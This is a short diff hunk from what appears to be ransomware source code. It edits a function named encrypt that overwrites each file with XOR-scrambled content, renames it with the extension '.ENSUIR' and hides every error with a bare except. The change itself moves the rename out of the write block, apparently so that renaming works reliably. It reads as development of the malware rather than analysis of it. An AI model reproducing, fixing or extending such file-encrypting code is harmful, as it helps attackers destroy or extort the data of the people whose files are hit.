@@ -27,7 +27,7 @@ def encrypt(file):
             data = f.read()
         with open(file, 'wb') as fp:
             fp.write(xord(data))
-            os.rename(file, file+".ENSUIR")
+        os.rename(file, file+".ENSUIR")
     except:
         pass
 
